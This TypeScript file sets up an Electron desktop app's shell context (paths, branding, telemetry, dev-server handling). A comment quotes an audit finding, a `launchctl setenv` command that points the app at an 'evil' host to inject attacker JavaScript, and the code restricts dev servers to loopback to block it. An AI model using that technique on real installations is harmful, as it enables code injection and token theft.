import * as Path from "effect/Path";
import * as Option from "effect/Option";
import * as Layer from "effect/Layer";
import * as Effect from "effect/Effect";
import * as Context from "effect/Context";
import type { OtlpProtocol } from "@kora/shared/otlp";
import type { ShellAppBranding, ShellAppStageLabel, ShellRuntimeInfo } from "@kora/contracts";

import { resolveShellBaseDir, resolveShellStateDir } from "./ShellStatePaths.ts";
import * as ShellConfig from "./ShellConfig.ts";
import * as ShellAppPrefs from "../prefs/ShellAppPrefs.ts";

export interface MakeShellContextInput {
  readonly runningUnderArm64Translation: boolean;
  readonly resourcesPath: string;
  readonly isPackaged: boolean;
  readonly appPath: string;
  readonly appVersion: string;
  readonly processArch: string;
  readonly platform: NodeJS.Platform;
  readonly homeDirectory: string;
  readonly dirname: string;
}

export class ShellContext extends Context.Service<
  ShellContext,
  {
    readonly resolveResourcePathCandidates: (fileName: string) => readonly string[];
    readonly resolvePickFolderDefaultPath: (rawOptions: unknown) => Option.Option<string>;
    readonly runtimeInfo: ShellRuntimeInfo;
    readonly defaultDesktopSettings: ShellAppPrefs.ShellPrefs;
    readonly legacyUserDataDirName: string;
    readonly userDataDirName: string;
    readonly displayName: string;
    readonly branding: ShellAppBranding;
    readonly otlpProtocol: OtlpProtocol;
    readonly otlpHeaders: Option.Option<Record<string, string>>;
    readonly otlpExportIntervalMs: number;
    readonly otlpTracesUrl: Option.Option<string>;
    readonly commitHashOverride: Option.Option<string>;
    readonly configuredBackendPort: Option.Option<number>;
    readonly devServerUrl: Option.Option<URL>;
    readonly preloadPath: string;
    /** The bundled kora-runtime.sh; absent in a checkout, which relies on scripts/start.sh. */
    readonly koraRuntimeScript: Option.Option<string>;
    readonly clientAssetsDir: string;
    readonly appRoot: string;
    readonly rootDir: string;
    readonly browserArtifactsDir: string;
    readonly logDir: string;
    readonly daemonSettingsPath: string;
    readonly clientSettingsPath: string;
    readonly desktopSettingsPath: string;
    readonly stateDir: string;
    readonly baseDir: string;
    /** Electron's per-user application support folder (not Kora's own state). */
    readonly appDataDirectory: string;
    readonly homeDirectory: string;
    readonly resourcesPath: string;
    readonly appPath: string;
    readonly appVersion: string;
    /** True when a Vite dev server is configured. */
    readonly isDevelopment: boolean;
    readonly isPackaged: boolean;
    readonly processArch: string;
    readonly platform: NodeJS.Platform;
    readonly dirname: string;
    readonly path: Path.Path;
  }
>()("@kora/desktop/app/ShellContext") {}

function resolveShellAppBranding(args: {
  readonly isDevelopment: boolean;
  readonly appVersion: string;
}): ShellAppBranding {
  const baseName = "Kora";
  const stageLabel: ShellAppStageLabel = args.isDevelopment ? "Dev" : "Alpha";
  return {
    baseName,
    stageLabel,
    displayName: stageLabel === "Alpha" ? baseName : `${baseName} (${stageLabel})`,
  };
}

function resolveRuntimeInfo(options: MakeShellContextInput): ShellRuntimeInfo {
  const appArch =
    options.processArch === "arm64" ? "arm64" : options.processArch === "x64" ? "x64" : "other";
  const translated = options.platform === "darwin" && options.runningUnderArm64Translation;
  return {
    appArch,
    hostArch: translated ? "arm64" : appArch,
    runningUnderArm64Translation:
      options.platform === "darwin" ? options.runningUnderArm64Translation : false,
  };
}

/** A dev server the shell may load its app window from: http(s) on a loopback host. */
export function isLoopbackDevServer(url: URL): boolean {
  if (url.protocol !== "http:" && url.protocol !== "https:") return false;
  if (url.username || url.password) return false;
  return url.hostname === "127.0.0.1" || url.hostname === "localhost" || url.hostname === "[::1]";
}

export const layer = (options: MakeShellContextInput) =>
  Layer.effect(
    ShellContext,
    Effect.gen(function* () {
      const loc = yield* Path.Path;
      const cfg = yield* ShellConfig.ShellConfig;

      // The privileged kora(-dev)://app window loads from the dev server when VITE_DEV_SERVER_URL is set. A released
      // app never obeys it (2026-10-15 audit desktop #1: `launchctl setenv VITE_DEV_SERVER_URL https://evil/` made the
      // signed Kora serve attacker JS with the shell bridge and the daemon bearer), and a checkout only from loopback.
      const devServerUrl = options.isPackaged
        ? Option.none<URL>()
        : Option.filter(cfg.devServerUrl, isLoopbackDevServer);
      const isDevelopment = Option.isSome(devServerUrl);
      const flavor = cfg.appFlavor;
      // A flavored bundle (Kora Dev) is its own app, so it looks like a development build even when packaged.
      const branding = resolveShellAppBranding({
        isDevelopment: isDevelopment || Option.isSome(flavor),
        appVersion: options.appVersion,
      });

      const joinPath = loc.join;
      const baseDir = resolveShellBaseDir({
        homeDirectory: options.homeDirectory,
        joinPath,
        koraHome: cfg.koraHome,
      });
      const stateDir = resolveShellStateDir({
        baseDir,
        isDevelopment,
        joinPath,
        koraHome: cfg.koraHome,
      });

      const rootDir = loc.resolve(options.dirname, "../../..");
      const appRoot = options.isPackaged ? options.appPath : rootDir;
      // Never derived from app.getAppPath(): a renamed Electron launched with a script path counts as "packaged"
      // while its appPath is the script's folder, which would leave every kora:// request unanswered.
      const clientAssetsDir = options.isPackaged
        ? loc.join(options.resourcesPath, "web")
        : loc.join(rootDir, "apps", "web", "dist");

      const userDataDirName = Option.isSome(flavor)
        ? `kora-${flavor.value}-app`
        : isDevelopment
          ? "kora-dev"
          : "kora";
      const legacyUserDataDirName = Option.isSome(flavor)
        ? userDataDirName
        : isDevelopment
          ? "kora (Dev)"
          : "kora";

      const expandHome = (val: string) =>
        val === "~"
          ? options.homeDirectory
          : val.startsWith("~/")
            ? loc.join(options.homeDirectory, val.slice(2))
            : loc.resolve(val);

      return ShellContext.of({
        path: loc,
        dirname: options.dirname,
        platform: options.platform,
        processArch: options.processArch,
        isPackaged: options.isPackaged,
        isDevelopment,
        appVersion: options.appVersion,
        appPath: options.appPath,
        resourcesPath: options.resourcesPath,
        homeDirectory: options.homeDirectory,
        // Where Electron keeps its userData: %APPDATA% on Windows, ~/Library/Application Support on macOS.
        appDataDirectory:
          options.platform === "win32"
            ? Option.getOrElse(cfg.appDataDirectory, () =>
                loc.join(options.homeDirectory, "AppData", "Roaming"),
              )
            : loc.join(options.homeDirectory, "Library", "Application Support"),
        baseDir,
        stateDir,
        desktopSettingsPath: loc.join(stateDir, "shell-prefs.json"),
        clientSettingsPath: loc.join(stateDir, "client-prefs.json"),
        daemonSettingsPath: loc.join(stateDir, "settings.json"),
        logDir: loc.join(stateDir, "logs"),
        browserArtifactsDir: loc.join(stateDir, "browser-artifacts"),
        rootDir,
        appRoot,
        clientAssetsDir,
        koraRuntimeScript: options.isPackaged
          ? Option.some(
              loc.join(
                options.resourcesPath,
                options.platform === "win32" ? "kora-runtime.cjs" : "kora-runtime.sh",
              ),
            )
          : Option.none(),
        preloadPath: loc.join(options.dirname, "preload.cjs"),
        devServerUrl,
        configuredBackendPort: cfg.configuredBackendPort,
        commitHashOverride: cfg.commitHashOverride,
        otlpTracesUrl: cfg.otlpTracesUrl,
        otlpExportIntervalMs: cfg.otlpExportIntervalMs,
        otlpHeaders: cfg.otlpHeaders,
        otlpProtocol: cfg.otlpProtocol,
        branding,
        displayName: branding.displayName,
        userDataDirName,
        legacyUserDataDirName,
        defaultDesktopSettings: ShellAppPrefs.resolveDefaultShellPrefs(options.appVersion),
        runtimeInfo: resolveRuntimeInfo(options),
        resolvePickFolderDefaultPath: (rawOptions) => {
          if (typeof rawOptions !== "object" || rawOptions === null) return Option.none();
          const initialPath = (rawOptions as { initialPath?: unknown }).initialPath;
          if (typeof initialPath !== "string") return Option.none();
          const stripped = initialPath.trim();
          return stripped.length === 0 ? Option.none() : Option.some(expandHome(stripped));
        },
        resolveResourcePathCandidates: (fileName) => [
          loc.join(options.dirname, "..", "resources", fileName),
          loc.join(options.dirname, "..", "prod-resources", fileName),
          loc.join(options.resourcesPath, "resources", fileName),
          loc.join(options.resourcesPath, fileName),
        ],
      });
    }),
  );
